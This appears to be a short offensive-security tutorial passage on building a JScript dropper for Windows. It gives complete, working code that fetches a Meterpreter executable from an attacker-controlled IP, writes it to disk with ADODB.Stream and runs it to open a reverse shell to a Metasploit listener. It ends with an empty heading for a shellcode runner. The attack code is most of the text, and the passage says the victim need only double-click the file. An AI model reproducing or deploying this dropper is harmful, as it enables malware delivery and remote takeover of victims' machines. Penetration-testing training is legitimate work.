## Creating Basic Dropper Using Jscript

First, we'll use msfvenom to generate a 64-bit Meterpreter reverse HTTPS executable named met.exe and save it to our Kali web root. 

We'll also set up a Metasploit multi/handler to catch the session.
```
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

The complete Jscript code to download and execute our Meterpreter shell
```
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```
After saving this code as a .js file, all we need to do is double-click it to get a 64-bit shell from the victim's machine to our awaiting multi/handler listener.

## JScript Shellcode Runner
![alt text](image.png)